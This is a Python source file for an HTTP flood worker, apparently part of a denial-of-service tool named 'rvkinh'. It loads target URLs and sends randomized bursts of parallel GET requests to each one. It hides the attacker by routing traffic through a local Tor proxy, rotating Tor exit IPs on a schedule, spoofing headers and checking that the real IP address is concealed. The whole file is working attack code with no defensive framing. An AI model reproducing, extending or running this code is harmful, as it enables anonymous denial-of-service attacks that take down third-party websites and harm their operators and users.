import random
import time
from typing import Dict
from aiohttp import ClientSession
import asyncio
from injectable import injectable, autowired, Autowired
from rvkinh_message_protocol import HttpResponse
from rvkinh_utils import UtilsAiohttp, UtilsSpoofing, UtilsTor
from storage.storage_target import StorageTarget
from storage.storage_settings import StorageSettings


@injectable
class ServiceAttackHttpFlood:
    @autowired
    def __init__(self,
                 storage_target: Autowired(StorageTarget), storage_settings: Autowired(StorageSettings),
                 utils_aiohttp: Autowired(UtilsAiohttp), utils_spoofing: Autowired(UtilsSpoofing), utils_tor: Autowired(UtilsTor)
                 ):
        self.storage_target = storage_target
        self.storage_settings = storage_settings
        self.utils_aiohttp = utils_aiohttp
        self.utils_spoofing = utils_spoofing
        self.utils_tor = utils_tor

    async def attack_epoch(self, epoch_number: int):
        print('ServiceAttackHttpFlood.attack_epoch(): Started epoch #' + str(epoch_number))

        # Pull target & settings
        http_flood_target_urls = self.storage_target.get_http_flood_target_urls()
        worker_settings = self.storage_settings.get_worker_settings()

        # If we have no targets
        if len(http_flood_target_urls) == 0:
            print('ServiceAttackHttpFlood.attack_epoch(): WARNING!!! No available URLs found, skipping epoch #' + str(epoch_number))
            time.sleep(30)
            return

        # Debug targets
        for t in http_flood_target_urls:
            print('ServiceAttackHttpFlood.attack_epoch(): Target ' + t)

        # Select proxy
        proxy = None
        if worker_settings.proxy_type.lower().strip() == 'tor':
            proxy = "http://127.0.0.1:8118"
        if proxy:
            print('ServiceAttackHttpFlood.attack_epoch(): Selected proxy ' + proxy)
        else:
            print('ServiceAttackHttpFlood.attack_epoch(): WARNING!!! Proxy is disabled')

        # Open session
        session = ClientSession()

        # Make sure your current IP is hidden
        check_my_ip_result = await self.check_my_ip(session, proxy=proxy)

        # Randomize targets
        random.shuffle(http_flood_target_urls)

        # For each target
        for i in range(0, len(http_flood_target_urls)):
            # Get URL & headers
            target_url = http_flood_target_urls[i]
            headers = self.utils_spoofing.get_header()

            # If scheduled - change IP
            if worker_settings.proxy_type.lower().strip() == 'tor':
                if worker_settings.proxy_ip_change_frequency > 0:
                    if i > 0 and i % worker_settings.proxy_ip_change_frequency == 0:
                        self.utils_tor.change_ip_tor()

            # Determine how many requests we need to make
            number_of_requests = random.randint(worker_settings.parallel_min_requests, worker_settings.parallel_max_requests)

            # Generate URLs
            current_target_urls = [target_url for j in range(0, number_of_requests)]

            # Run requests
            parallel_response = await self.utils_aiohttp.http_get_with_aiohttp_parallel(session, current_target_urls, headers=headers, proxy=proxy, timeout=15, ignore_json=True, ignore_body=True)
            self.utils_aiohttp.debug_stats(target_url, parallel_response.responses, parallel_response.execution_time)

        # Close session
        await session.close()

        print('ServiceAttackHttpFlood.attack_epoch(): Ended epoch #' + str(epoch_number))

    async def check_my_ip(self, session: ClientSession, headers: Dict = {}, proxy: str = None, timeout: int = 10, debug: bool = True) -> HttpResponse:
        result = await self.utils_aiohttp.http_get_with_aiohttp(session, 'https://api.myip.com/', headers=headers, proxy=proxy, timeout=timeout)
        if result.status_code == 200:
            if debug:
                print("ServiceAttackHttpFlood.check_my_ip(): Your current IP address: " + str(result.json))
        else:
            if debug:
                print("ServiceAttackHttpFlood.check_my_ip(): WARNING!!! Failed to get your current IP address: " + str(result))
        return result